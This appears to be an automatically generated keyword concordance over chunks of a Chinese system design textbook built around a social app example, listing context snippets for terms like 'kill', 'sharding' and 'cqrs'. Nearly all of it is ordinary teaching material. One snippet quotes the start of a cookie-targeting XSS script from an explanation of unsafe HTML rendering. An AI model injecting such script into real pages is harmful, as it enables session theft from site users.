  c13_b14.md: ...REST API 时，客户端和服务器很容易悄悄分叉（服务器重命名字段，客户端仍发旧名，被静默忽略）。Protocol Buffers 让这种不匹配变成编译时或 schema 校验错误。   ### 本章总结  微服务把单体拆分成独立部署的服务，每个服务...

=== elena (9 occurrences) ===
  c14_b12.md: ...每次帖子查看都产生事件）使用 ONE 一致性可最大化吞吐。速度和可用性比分析摄入的完美一致性更重要。  **Q2.** Elena 在柏林、Marco 在圣保罗，两人同时更新各自个人简介。Elena 的请求进入欧洲数据中心；Marco 的请求进入南美...
  c14_b12.md: ...性比分析摄入的完美一致性更重要。  **Q2.** Elena 在柏林、Marco 在圣保罗，两人同时更新各自个人简介。Elena 的请求进入欧洲数据中心；Marco 的请求进入南美数据中心。两次写入都在本地成功。当数据中心互相复制时，Marco 的...
  c14_b12.md: ...成功。当数据中心互相复制时，Marco 的资料上检测到冲突。  等等——再读一遍场景。Marco 更新*他自己*的简介，Elena 更新*她自己*的简介。这真的有冲突吗？请重述该场景使其产生真正的写冲突，然后描述应如何解决。  提示  真正的写冲突需...
  c14_b12.md: ...，然后描述应如何解决。  提示  真正的写冲突需要同一条记录在两个地方同时被修改。  **答案：** 原始场景没有冲突。Elena 和 Marco 更新的是不同记录（他们各自的资料）。写入的是数据库中完全不同的行，可以无冲突地同时应用。  产生真正冲...
  c14_b12.md: ...记录（他们各自的资料）。写入的是数据库中完全不同的行，可以无冲突地同时应用。  产生真正冲突的重述场景：Marco 和 Elena 都是某个共享社区页面的管理员。Marco 在圣保罗把社区页面描述更新为 “A community for jazz l...
  c14_b12.md: ...区页面的管理员。Marco 在圣保罗把社区页面描述更新为 “A community for jazz lovers.”；Elena 在柏林把同一社区页面描述更新为 “A place for jazz enthusiasts.”。两次写入几乎同时在当地...
  c14_b13.md: ...**用物理时间戳的最后写入获胜：** 比较时间戳。如果 Marco 的写入时间戳为 14:00:00.123 UTC，Elena 的写入时间戳为 14:00:00.089 UTC（尽管 Elena 觉得自己“先”写），Marco 的写获胜。Elen...
  c14_b13.md: ...lena 的写入时间戳为 14:00:00.089 UTC（尽管 Elena 觉得自己“先”写），Marco 的写获胜。Elena 的改动被静默丢弃。后果：Elena 的修改丢失且未被告知。  **更好的方法——带冲突暴露的乐观锁：** 写操作包含它...
  c14_b13.md: ...:00.089 UTC（尽管 Elena 觉得自己“先”写），Marco 的写获胜。Elena 的改动被静默丢弃。后果：Elena 的修改丢失且未被告知。  **更好的方法——带冲突暴露的乐观锁：** 写操作包含它读到的记录版本号。当第二次写尝试提交...

=== marco (9 occurrences) ===
  c14_b12.md: ...件）使用 ONE 一致性可最大化吞吐。速度和可用性比分析摄入的完美一致性更重要。  **Q2.** Elena 在柏林、Marco 在圣保罗，两人同时更新各自个人简介。Elena 的请求进入欧洲数据中心；Marco 的请求进入南美数据中心。两次写入都...
  c14_b12.md: ...**Q2.** Elena 在柏林、Marco 在圣保罗，两人同时更新各自个人简介。Elena 的请求进入欧洲数据中心；Marco 的请求进入南美数据中心。两次写入都在本地成功。当数据中心互相复制时，Marco 的资料上检测到冲突。  等等——再读一...
  c14_b12.md: ...介。Elena 的请求进入欧洲数据中心；Marco 的请求进入南美数据中心。两次写入都在本地成功。当数据中心互相复制时，Marco 的资料上检测到冲突。  等等——再读一遍场景。Marco 更新*他自己*的简介，Elena 更新*她自己*的简介。这真...
  c14_b12.md: ...进入南美数据中心。两次写入都在本地成功。当数据中心互相复制时，Marco 的资料上检测到冲突。  等等——再读一遍场景。Marco 更新*他自己*的简介，Elena 更新*她自己*的简介。这真的有冲突吗？请重述该场景使其产生真正的写冲突，然后描述应如...
  c14_b12.md: ...解决。  提示  真正的写冲突需要同一条记录在两个地方同时被修改。  **答案：** 原始场景没有冲突。Elena 和 Marco 更新的是不同记录（他们各自的资料）。写入的是数据库中完全不同的行，可以无冲突地同时应用。  产生真正冲突的重述场景：M...
  c14_b12.md: ...o 更新的是不同记录（他们各自的资料）。写入的是数据库中完全不同的行，可以无冲突地同时应用。  产生真正冲突的重述场景：Marco 和 Elena 都是某个共享社区页面的管理员。Marco 在圣保罗把社区页面描述更新为 “A community fo...
  c14_b12.md: ...全不同的行，可以无冲突地同时应用。  产生真正冲突的重述场景：Marco 和 Elena 都是某个共享社区页面的管理员。Marco 在圣保罗把社区页面描述更新为 “A community for jazz lovers.”；Elena 在柏林把同一社...
  c14_b13.md: ...**用物理时间戳的最后写入获胜：** 比较时间戳。如果 Marco 的写入时间戳为 14:00:00.123 UTC，Elena 的写入时间戳为 14:00:00.089 UTC（尽管...
  c14_b13.md: ...0.123 UTC，Elena 的写入时间戳为 14:00:00.089 UTC（尽管 Elena 觉得自己“先”写），Marco 的写获胜。Elena 的改动被静默丢弃。后果：Elena 的修改丢失且未被告知。  **更好的方法——带冲突暴露的乐观...

=== kill (9 occurrences) ===
  c16_b10.md: ...表示健康运行？（请求延迟低于 200ms，错误率低于 0.1%，所有健康检查为绿。） 2. **假设：** “如果我们 kill 一台应用服务器，我们相信负载均衡器会在 5 秒内重新分配流量，稳态得以维持。” 3. **引入故障：** 在生产环境...
  c16_b10.md: ...一台应用服务器，我们相信负载均衡器会在 5 秒内重新分配流量，稳态得以维持。” 3. **引入故障：** 在生产环境 kill 一台应用服务器。 4. **观察：** 稳态是否保持？如果没有，什么降了多少？ 5. **改进：** 如果假设错误（例...
  c16_b10.md: ...户），团队随时待命准备中止。  对从未做过混沌工程的团队，起点很简单：定期安排“game day”，模拟已知故障场景——kill 一台应用服务器、终止一个数据库副本、打满 Redis 线程池。观察系统如何响应。修复损坏之处。建立信心。...
  c16_b17.md: ...#### 深入思考  **Q1.** Netflix 的混沌工程包括故意 kill 生产服务器。一位 CTO 反对：“这太疯狂了——为什么我们要故意破坏自己的生产系统？我们已经有足够多真实失败，不需要制...
  c16_b17.md: ...他们在客户体验到脆弱性之前发现并修复了它们。  混沌工程的受控本质正是其安全之处：实验在工作时间运行，团队盯着，准备了 kill switch，只影响一小部分流量。这从根本上比等待失控事件更安全。  **Q2.** 主主数据库配置允许两个数据中心（...
  c18_b04.md: ...该跳闸”与“Redis 宕机时熔断器确实跳闸”之间的差距。前者是设计声明，后者是经验结果。  混沌实验例子：  * **kill 一个数据库副本：** 流量是否自动路由到主库？耗时多久？过渡期间用户体验如何？ * **向 Feed Service...
  c18_b12.md: ...离。  **Q2.** SocialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pendi...
  c18_b14.md: ...故意引入特定、有界、被监控的失败，以验证系统按设计处理它。”Netflix Chaos Monkey 并非无观察地随机 kill 生产服务器——它是在工作时间、工程师盯着、自动监控和回滚流程就绪时 kill。目标是让潜在失败在成为意外事件前浮出水面...
  c18_b14.md: ...haos Monkey 并非无观察地随机 kill 生产服务器——它是在工作时间、工程师盯着、自动监控和回滚流程就绪时 kill。目标是让潜在失败在成为意外事件前浮出水面。  对大多数服务用户的生产系统（非生命安全），graduated 混沌工程—...

=== postscheduler (9 occurrences) ===
  c19_b03.md: ...概念）  当用户把第三方应用（“PostScheduler”）连接到 SocialSnap 时，发生如下过程：  1. PostScheduler 把用户重定向到 SocialSnap 的授权页：“PostScheduler 希望访问：读取你的帖子、代表你发帖。允许...
  c19_b03.md: ...alSnap 时，发生如下过程：  1. PostScheduler 把用户重定向到 SocialSnap 的授权页：“PostScheduler 希望访问：读取你的帖子、代表你发帖。允许或拒绝？” 2. 用户点击“允许”。SocialSnap 生成一个 **aut...
  c19_b03.md: ...2. 用户点击“允许”。SocialSnap 生成一个 **authorization code**，并把用户重定向回 PostScheduler。 3. PostScheduler 把这个 authorization code 发到 SocialSnap 的 to...
  c19_b03.md: ...Snap 生成一个 **authorization code**，并把用户重定向回 PostScheduler。 3. PostScheduler 把这个 authorization code 发到 SocialSnap 的 token 端点（server-to-s...
  c19_b03.md: ...。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization: Bearer eyJhbGciOi....
  c19_b03.md: ...ocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与...
  c19_b03.md: ...用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限...
  c19_b03.md: ...获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的...
  c19_b03.md: ...ss token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻击者只获得 access token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——T...

=== flask (8 occurrences) ===
  c01_b02.md: ...nap**，一个从极小开始成长的社交平台。现在，在 v0 版本，它已经是系统能简单到的样子：  * 一个 Python/Flask 应用 * 一台运行在同一台机器上的 PostgreSQL 数据库 * 托管在一台笔记本电脑（或廉价 VPS）上 * 三...
  c01_b02.md: ...台笔记本电脑（或廉价 VPS）上 * 三个用户：你和两个朋友      [ Browser ] ──HTTP──> [ Flask App + PostgreSQL ] (one machine)  这是一个完全有效的系统。它完成了目标。它有组件（浏...
  c01_b08.md: ...**答案：** SocialSnap v0 是本章引入的贯穿例子：一台机器上的 Python/Flask 应用，配 PostgreSQL 数据库，服务少量用户。它被称为“完全有效的系统”，是因为它在当前规模下完成了目标——用...
  c01_b08.md: ...文章、互相阅读。“有效”并不意味着“可扩展”。一个系统的好坏是相对于它要解决的问题来评估的。对于三个用户来说，一台运行 Flask 和 Postgres 的笔记本就是正确答案——它简单、构建快、易于理解、运行便宜。只有当你试图用它服务一百万用户时，这...
  c05_b06.md: ...用到给 SocialSnap 第一个真正的数据库。架构从：       [ Browser ] ──HTTP──> [ Flask App + in-memory dict ] (one machine)   升级到：       [ Browser...
  c05_b06.md: ...y dict ] (one machine)   升级到：       [ Browser ] ──HTTP──> [ Flask App ] ──SQL──> [ PostgreSQL ] (one machine)   仍然是一台机器，但现在数据...
  c05_b14.md: ...高成本下提供最大正确性。  我们介绍了 **SocialSnap v1**：一个由 PostgreSQL 数据库支持的 Flask 应用，schema 包含 users、posts、follows 和 likes。这是一个完整、正确的基础，能在触及限...
  c27_b01.md: ...第 1 章：笔记本电脑上的一个函数（第 1–4 周）  **它是什么：** 开发者笔记本电脑上运行的一个 Python Flask 应用。单个端点。没有数据库——数据存在内存 Python 字典里。服务器重启后所有数据丢失。  **为什么正确：**...

=== billion (8 occurrences) ===
  c03_b02.md: ...1,048,576 | ~1 million | 1 MB | | 2^30 | 1,073,741,824 | ~1 billion | 1 GB | | 2^40 | ~1 trillion | ~1 trillion | 1 TB | | 2^50...
  c03_b02.md: ...10^3 | 1 thousand | K | | 10^6 | 1 million | M | | 10^9 | 1 billion | B（字节时也可用 G） | | 10^12 | 1 trillion | T |  信封背面估算的艺术，就是把这些...
  c05_b10.md: ...）SocialSnap 的 `likes` 表快速增长：每天 300 万新点赞。一年后 `likes` 表约有 1.1 billion（11 亿）行。查询“帖子 12345 有多少赞？”现在花 500ms。诊断可能原因并提出修复方案，同时考虑 trade...
  c05_b10.md: ...询是 `SELECT COUNT(*) FROM likes WHERE post_id = 12345`。在 1.1 billion（11 亿）行下，如果 `post_id` 没有索引（或索引已碎片化/低效），这就在做全表扫描或很大的索引扫描。即使有索...
  c06_b01.md: ...络存储 200 百万（2 亿）用户，需要在 10 ms 内回答“Alice 是不是 Bob 的朋友？”。友谊图有 50 billion（500 亿）条边。在关系型数据库中，回答“Alice 是不是 Bob 的朋友？”是单次索引查找。但“Alice 的所有...
  c06_b05.md: ...### 6.5 图数据库——关系作为一等公民  回想本章开头的第二个谜题：一个有 50 billion（500 亿）条友谊边、需要高效回答“Alice 的朋友的朋友都有谁？”的社交网络。  在关系型数据库中，友谊是一张表：...
  c06_b05.md: ...user_id = alice_id       AND f2.friend_id != alice_id;   50 billion（500 亿）行的情况下，这个 join 极其昂贵。“朋友的朋友的朋友”（3 跳）需要三次自 join——基本不可用。...
  c23_b10.md: ...2,000 个 posting（每个不同词一个）。100 亿（10 billion）页：总 posting = 10 billion × 2,000 = 20 万亿（trillion）posting。每个 posting 8 + 4 + 4 = 16...

=== million (8 occurrences) ===
  c03_b02.md: ...2^10 | 1,024 | ~1 thousand | 1 KB | | 2^20 | 1,048,576 | ~1 million | 1 MB | | 2^30 | 1,073,741,824 | ~1 billion | 1 GB | | 2^4...
  c03_b02.md: ...| 常用名称 | |---|---|---| | 10^3 | 1 thousand | K | | 10^6 | 1 million | M | | 10^9 | 1 billion | B（字节时也可用 G） | | 10^12 | 1 trilli...
  c05_b11.md: ...数查询降到 O(log n + k)，k 是该帖子的点赞数。对 10,000（1 万）赞的帖子，这快得多。但对有 50 million（5000 万）赞的病毒帖，即使索引扫描也要花不少时间。  **方案 2：反规范化计数器（更适合点赞数这种场景）**...
  c05_b12.md: ...果没有 `user_id` 索引，数据库会执行全表扫描——读取 `posts` 的每一行来找到属于用户 42 的。10 million（1000 万）帖子、10,000（1 万）用户，平均每个用户只有约 1,000 行。数据库读 1000 万行来返回 1...
  c06_b11.md: ...在关系型数据库中，hashtag 计数来自聚合查询（COUNT + GROUP BY）。想想这个查询在 50 million（5000 万）帖子表上运行时会发生什么。然后想想键值存储如何用有序集合增量维护计数。  **答案：**  **关系型方...
  c06_b11.md: ...ER BY count DESC     LIMIT 10;   **Tradeoff（权衡）：** 如果每天有 50 million（5000 万）帖子、每个帖子约 2 个 hashtag，这个查询扫描过去 24 小时的 1 亿行。即使有 `creat...
  c11_b08.md: ...题规模才能判断需要垂直还是水平扩展。预期 10,000（10000）名并发用户的初创公司可能只需一台大实例。预期 10 million（1000 万）并发用户的平台需要跨多台实例水平扩展。   ### 11.7 协调开销——分布式系统的成本  水平扩展产...
  c24_b10.md: ...万（10 million）观众。每个观众每 8 秒请求一个 5MB 片段 = 625 KB/s。新加坡边缘总带宽：10 million × 625 KB/s = 6.25 TB/s = 50 Tbps。全球层面：1 亿（100 million）观众 ×...

=== content (8 occurrences) ===
  c05_b01.md: ...| `$2b$12...` | 2024-02-01 |  **posts 表**  | id | user_id | content | created_at | |---|---|---|---| | 101 | 1 | "Just launched...
  c05_b02.md: ...ice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.created_at     FROM posts     JOIN users ON posts.us...
  c05_b06.md: ...INTEGER REFERENCES users(id) ON DELETE CASCADE,         content     TEXT NOT NULL,         like_count  INTEGER DEFAULT 0,...
  c05_b06.md: ...询**——“给 Alice 看她关注的人最近 20 条帖子”：      SELECT posts.id, posts.content, posts.created_at, users.username     FROM posts     JOIN f...
  c05_b10.md: ...）  **查询——所有提及 Alice 的帖子，最新在前：**      SELECT posts.id, posts.content, posts.created_at, author.username AS author     FROM menti...
  c05_b12.md: ...独查询的简单 URL 列表，数组列在这个规模下是实用选择。  **查询与索引需求：**      SELECT id, content, image_urls, created_at     FROM posts     WHERE user_id =...
  c19_b06.md: ...。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：       <div class="post">{{ post.content }}</div>   如果用户发布 `<script>document.cookie = document.cooki...
  c24_b04.md: ...秒片段，100ms 是片段时长的 5%——不算灾难，但 2 小时电影中播放器要请求数百片段时会累积。  解决方案是 **Content Delivery Network（CDN）**：一个全球分布的服务器网络，把视频内容缓存到离观众近的地方。   ###...

=== sharding (8 occurrences) ===
  c05_b03.md: ...000,000) ≈ 27 次比较——而不是 1 亿次。  把 B-tree 索引想象成书的索引。你不用读完整本书去找“sharding（分片）”的出现，直接在索引里查 “sharding”（O(log n) 查找），得到页码。  当你在 `posts.u...
  c05_b03.md: ...次。  把 B-tree 索引想象成书的索引。你不用读完整本书去找“sharding（分片）”的出现，直接在索引里查 “sharding”（O(log n) 查找），得到页码。  当你在 `posts.user_id` 上建索引：      CREATE...
  c23_b05.md: ...buted systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based sharding**。  **按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小型倒排索引。查询 "distr...
  c23_b05.md: ...buted systems" 并行命中所有分片；每个分片返回本地结果；结果合并。这叫 **document-based sharding**。  实践中，大型搜索引擎使用 document-based sharding，因为它允许最自然的并行：查询同时发往...
  c23_b05.md: ...叫 **document-based sharding**。  实践中，大型搜索引擎使用 document-based sharding，因为它允许最自然的并行：查询同时发往所有分片，每个分片并行产生结果，再合并。Term-based sharding 会...
  c23_b05.md: ...d sharding，因为它允许最自然的并行：查询同时发往所有分片，每个分片并行产生结果，再合并。Term-based sharding 会产生倾斜问题（有些词远比其他词常见，造成热分片）且多词查询需要跨多个分片协调。  * * *   ### 23.3...
  c23_b10.md: ...t 中的偏移）是 comparatively 小的额外结构。  **Q2.** 一个使用 document-based sharding 的搜索引擎有 100 个分片，每个分片持有 1 亿（100 million）页。用户提交一个 3 词查询。遍历从用户按...
  c28_b12.md: ...Ch 12) | 读延迟更低 | 最终（复制 lag） | 读可用性更高 | 中——故障转移配置 **Database sharding** (Ch 12) | 写延迟更低（分布式写） | 分片内强；跨分片困难 | 高——分片故障影响 1/N 数据 | 高...

=== graph (8 occurrences) ===
  c06_b15.md: ...ob，但 Bob 不一定关注 Alice）。在 Instagram 规模（数亿条边）下，这实际上由专门的 follow-graph 服务支持，底层用键值存储或自定义图存储，而不是通用图数据库。Neo4j 在中等规模工作，但难以跨机器分布。据报道 In...
  c15_b12.md: ...llowed_id: 77, request_id: "req_a1b2c3"}`。  **第 1 步——Social Graph Service：** 监听 `follow.requested`。在 `friendships` 表中插入 `{fol...
  c15_b12.md: ...入 `{follower: 42, following: 77}`（幂等：先检查关系是否已存在）。发布 `follow.graph.updated` 事件，带上 `request_id`。  **第 2 步——User Service：** 监听 `...
  c15_b12.md: ...d` 事件，带上 `request_id`。  **第 2 步——User Service：** 监听 `follow.graph.updated`。为用户 77 递增 `follower_count`。（使用 CRDT 风格递增，或幂等语句（幂等性...
  c15_b12.md: ...`follow.notification.sent` 事件。  **补偿流：**  如果第 1 步失败（Social Graph Service 宕机）：`follow.requested` 消息留在队列中重试。如果重试耗尽，编排器（或监控告警）把...
  c15_b12.md: ...排器（或监控告警）把关注标记为失败。无需补偿——还没有任何变更。  如果第 2 步在第 1 步成功后失败：Social Graph Service 发布 `follow.graph.update.failed`。User Service 监听该事件（...
  c15_b12.md: ...没有任何变更。  如果第 2 步在第 1 步成功后失败：Social Graph Service 发布 `follow.graph.update.failed`。User Service 监听该事件（它已从第 1 步事件知道请求）——但此情况下第 2...
  c15_b12.md: ...ervice 监听该事件（它已从第 1 步事件知道请求）——但此情况下第 2 步尚未执行，所以无需补偿。`follow.graph.updated` 事件被重试。  如果第 3 步在第 1、2 步成功后失败：关注者数已更新，但通知没发送。这是可接受的...

=== fan (8 occurrences) ===
  c07_b15.md: ...性失效（可选，用于改善新鲜度）。_ 当名人（粉丝 >10,000）发帖时，**不要**把 10,000+ 粉丝缓存全部 fan-out 失效——这正是 Think Deeper 里提到的惊群问题。相反，让这些缓存按 TTL 自然过期。对普通用户（...
  c08_b11.md: ...er 处理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pub-sub（一个事件 → 多个消费者），在每个消费者类型内部用点对点（该类型的多个 worker 共...
  c28_b14.md: ...otocol** (Ch 26) | 无延迟开销 | 最终（传播延迟） | 极高（无中央协调器 SPOF） | 低 **Fan-out on write** (Ch 22) | 读极低（预计算） | 最终（feed 新鲜前有扇出延迟） | 高（读...
  c28_b14.md: ...) | 读极低（预计算） | 最终（feed 新鲜前有扇出延迟） | 高（读始终可用） | 中–高（扇出基础设施） **Fan-out on read** (Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） |...
  c28_b14.md: ...d** (Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） | 低 **Hybrid fan-out** (Ch 22) | 低（预计算 + 按需结合） | 普通用户最终；名人近实时 | 高 | 高——阈值管理、...
  c28_b14.md: ...otocol** (Ch 26) | 无延迟开销 | 最终（传播延迟） | 极高（无中央协调器 SPOF） | 低 **Fan-out on write** (Ch 22) | 读极低（预计算） | 最终（feed 新鲜前有扇出延迟） | 高（读...
  c28_b14.md: ...) | 读极低（预计算） | 最终（feed 新鲜前有扇出延迟） | 高（读始终可用） | 中–高（扇出基础设施） **Fan-out on read** (Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） |...
  c28_b14.md: ...d** (Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） | 低 **Hybrid fan-out** (Ch 22) | 低（预计算 + 按需结合） | 普通用户最终；名人近实时 | 高 | 高——阈值管理、...

=== cqrs (8 occurrences) ===
  c08_b05.md: ...选择。Kafka 在你需要高吞吐、多个独立消费者组或事件重放能力时才配得上它的复杂度。   ### 8.6 事件溯源与 CQRS——一种不同的架构哲学  上面的消息队列概念解决了一个运维问题（把生产者与消费者解耦）。但 Kafka 中基于日志的思考...
  c08_b06.md: ...reate-Read-Update-Delete）编程根本不同的心智模型。不熟悉的团队会犯可预见的错误。   #### CQRS——命令查询职责分离  事件溯源常与 **CQRS（Command Query Responsibility Segre...
  c08_b06.md: ...编程根本不同的心智模型。不熟悉的团队会犯可预见的错误。   #### CQRS——命令查询职责分离  事件溯源常与 **CQRS（Command Query Responsibility Segregation，命令查询职责分离）** 配对：写数据...
  c08_b06.md: ...ty Segregation，命令查询职责分离）** 配对：写数据的路径（命令）和读数据的路径（查询）应该分开。  在 CQRS 系统中，命令（写操作）经过事件溯源模型——它们产生存入事件日志的事件。查询（读操作）经过单独的读模型——当前状态的去规...
  c08_b06.md: ...们之间存在一定延迟。这重新引入了第 7 章的陈旧问题——读模型最终与写模型一致。这是否可接受取决于应用的一致性要求。  CQRS 和事件溯源很强大，但显著增加架构复杂度。只有在审计要求、复杂读模式或高吞吐需求证明成本合理时才值得采用。对 Socia...
  c08_b17.md: ...新构想为只追加日志，支持多个独立消费者组、事件重放和高吞吐。当需要这些能力时，它的额外复杂度才合理。  **事件溯源和 CQRS** 代表更深的架构哲学——存储历史而非当前状态，并把写模型与读模型分离。对审计密集型应用很强大；运维复杂。  **So...
  c20_b11.md: ...件。两条路径都不需要强一致性，因为分析数据本质上是时间性和累加的——漏掉一个点击是可接受的精度损失。  这是第 8 章 CQRS 模式在分析上的应用：写路径（Kafka）与读路径（历史查询走数据仓库、实时查询走 Redis）分离，各自为特定查询模式...
  c28_b12.md: ...**API gateway** (Ch 13, 9) | 小开销 | N/A | 中——未集群则 SPOF | 中 **CQRS** (Ch 8, 14) | 读延迟更低（优化读模型） | 最终（读模型可能落后写模型） | 高 | 高——维护两个模...

=== sent (8 occurrences) ===
  c08_b11.md: ...user_id = event['user_id']          # Check if we already sent the welcome email         already_sent = db.query(...
  c08_b11.md: ...rvice.send_welcome_email(user_id)          # Record that we sent it         db.execute(             "INSERT INTO sent_emails...
  c21_b03.md: ...TTP 连接的延迟太高。对于不频繁的事件（每客户端每分钟少于一次）或容忍一定延迟的场景，HTTP 轮询或 Server-Sent Events（一种比 WebSocket 更简单的单向推送机制）可能更合适。WebSocket 有真实成本：每个连接消...
  c21_b08.md: ...#### 投递状态机  每条消息经历状态转换：      SENT → DELIVERED → READ  * **SENT：** 发送者客户端把消息提交到服务器。服务器已持久化。 *...
  c21_b08.md: ...#### 投递状态机  每条消息经历状态转换：      SENT → DELIVERED → READ  * **SENT：** 发送者客户端把消息提交到服务器。服务器已持久化。 * **DELIVERED：** 接收者客户端收到消息（客户端...
  c21_b13.md: ...到到用户 A 的 UI 出现双勾的完整事件序列，包括所有网络调用、数据库写入和服务器间通信。  提示  追踪投递状态机：SENT → DELIVERED → READ。每个状态转换都需要一次数据库写入和一个实时事件回发发送者。思考连接服务器在步骤间...
  c21_b13.md: ...状态转换都需要一次数据库写入和一个实时事件回发发送者。思考连接服务器在步骤间崩溃会怎样。  **答案：**  **状态：SENT**  1. 用户 A 的客户端通过 WebSocket 向连接服务器 S1 发送 `{type: "message",...
  c21_b13.md: ...onv_id: C1, sender: A, content: "Hey!", sent_at: T1, state: SENT}` 到消息数据库。 4. 消息服务发送 `{type: "send_ack", client_msg_id: "c12...

=== status (8 occurrences) ===
  c09_b15.md: ...Key:   presence:{user_id}     Value: {last_seen: timestamp, status: "online"}     TTL:   5 minutes (300 seconds)   如果 presence...
  c16_b15.md: ...付处理器宕机，服务器仍能服务 99% 请求——不应被标记为不健康。  **响应格式：**       {       "status": "healthy" | "degraded" | "unhealthy",       "checks": {...
  c16_b15.md: ...ded" | "unhealthy",       "checks": {         "database": {"status": "ok", "latency_ms": 2},         "redis": {"status": "ok",...
  c16_b15.md: ...ase": {"status": "ok", "latency_ms": 2},         "redis": {"status": "ok", "latency_ms": 1},         "thread_pool": {"status":...
  c16_b15.md: ...{"status": "ok", "latency_ms": 1},         "thread_pool": {"status": "ok", "used": 45, "max": 200}       },       "timestamp":...
  c25_b06.md: ...ip_id = X FOR UPDATE;            -- 验证该行程尚未计费       IF trip.status = 'COMPLETED_UNBILLED' THEN         -- 计算最终车费         INSER...
  c25_b06.md: ...LUES (X, driver_payout, 'CREDIT');         UPDATE trips SET status = 'BILLED' WHERE trip_id = X;       END IF;     COMMIT;  `F...
  c25_b06.md: ...同一行程。状态检查实现幂等性（idempotency）：若计费被触发两次（如因网络超时导致计费服务重试），第二次发现 `status = 'BILLED'` 后什么都不做。  实际对乘客信用卡扣款通过外部支付处理器（Stripe、Braintree）完...

=== sentinel (8 occurrences) ===
  c11_b17.md: ...，还是只是把有状态问题往下推了一层。  Redis 本身必须冗余运行，以避免成为 SPOF。标准配置是 **Redis Sentinel** 或 **Redis Cluster**：一个 Redis 主节点处理写入；一个或多个副本节点持续从主节点复制；Se...
  c11_b17.md: ...el** 或 **Redis Cluster**：一个 Redis 主节点处理写入；一个或多个副本节点持续从主节点复制；Sentinel 进程监控主节点，并在主节点故障时自动提升副本（通常在数秒内完成）。应用服务器配置为使用 Sentinel 地址而非直接...
  c11_b17.md: ...从主节点复制；Sentinel 进程监控主节点，并在主节点故障时自动提升副本（通常在数秒内完成）。应用服务器配置为使用 Sentinel 地址而非直接 Redis 地址——故障转移后 Sentinel 告诉它们当前主节点在哪里。  这种配置下，Redis...
  c11_b17.md: ...自动提升副本（通常在数秒内完成）。应用服务器配置为使用 Sentinel 地址而非直接 Redis 地址——故障转移后 Sentinel 告诉它们当前主节点在哪里。  这种配置下，Redis 故障变成短暂事件：主节点宕机，Sentinel 检测到故障（通常...
  c11_b17.md: ...址——故障转移后 Sentinel 告诉它们当前主节点在哪里。  这种配置下，Redis 故障变成短暂事件：主节点宕机，Sentinel 检测到故障（通常 10-30 秒，取决于配置），提升副本，应用服务器重连到新主节点。这个窗口内会话会怎样？  被提升的...
  c11_b17.md: ...——它只是把状态移入专门构建、可冗余的基础设施，这些基础设施可以比普通应用服务器更高的可用性水平运行。Redis 配合 Sentinel 达到 99.99% 可用性，比应用服务器的 99.9% 强得多。...
  c16_b03.md: ...OF。 * 带自动故障转移的读副本（第 12 章）减少了数据库 SPOF（主库失败时提升副本为主库）。 * Redis Sentinel 或 Redis Cluster（第 11 章）消除了 Redis 会话存储 SPOF。 * 云基础设施的多个可用区消除...
  c20_b06.md: ...**可用性：** 重定向路径要求 99.99% 可用性。这意味着 Redis 缓存和数据库都必须高可用。Redis Sentinel 或 Redis Cluster（第 11 章）提供 Redis HA。主-副本自动故障转移（Patroni 或 AWS...

=== copy (8 occurrences) ===
  c12_b01.md: ...务器的完美副本，任何一台都能处理任何请求。  数据库不同。数据库**就是**状态。你不能简单复制数据库，把一半流量指向 Copy A、一半指向 Copy B，就算了——除非你能确保 Copy A 和 Copy B 保持同步。但让两个数据库在接受写入...
  c12_b01.md: ...都能处理任何请求。  数据库不同。数据库**就是**状态。你不能简单复制数据库，把一半流量指向 Copy A、一半指向 Copy B，就算了——除非你能确保 Copy A 和 Copy B 保持同步。但让两个数据库在接受写入的同时保持完美同步，是分...
  c12_b01.md: ...库**就是**状态。你不能简单复制数据库，把一半流量指向 Copy A、一半指向 Copy B，就算了——除非你能确保 Copy A 和 Copy B 保持同步。但让两个数据库在接受写入的同时保持完美同步，是分布式系统中最难的问题之一。如果 Cop...
  c12_b01.md: ...。你不能简单复制数据库，把一半流量指向 Copy A、一半指向 Copy B，就算了——除非你能确保 Copy A 和 Copy B 保持同步。但让两个数据库在接受写入的同时保持完美同步，是分布式系统中最难的问题之一。如果 Copy A 收到一个写...
  c12_b01.md: ...opy A 和 Copy B 保持同步。但让两个数据库在接受写入的同时保持完美同步，是分布式系统中最难的问题之一。如果 Copy A 收到一个写入，Copy B 还没听说，一个先写到 Copy A 再从 Copy B 读取的用户就会看到自己的写入消...
  c12_b01.md: ...保持同步。但让两个数据库在接受写入的同时保持完美同步，是分布式系统中最难的问题之一。如果 Copy A 收到一个写入，Copy B 还没听说，一个先写到 Copy A 再从 Copy B 读取的用户就会看到自己的写入消失。  这被称为**读己写一...
  c12_b01.md: ...的同时保持完美同步，是分布式系统中最难的问题之一。如果 Copy A 收到一个写入，Copy B 还没听说，一个先写到 Copy A 再从 Copy B 读取的用户就会看到自己的写入消失。  这被称为**读己写一致性（read-your-own-w...
  c12_b01.md: ...是分布式系统中最难的问题之一。如果 Copy A 收到一个写入，Copy B 还没听说，一个先写到 Copy A 再从 Copy B 读取的用户就会看到自己的写入消失。  这被称为**读己写一致性（read-your-own-writes cons...

=== counter (8 occurrences) ===
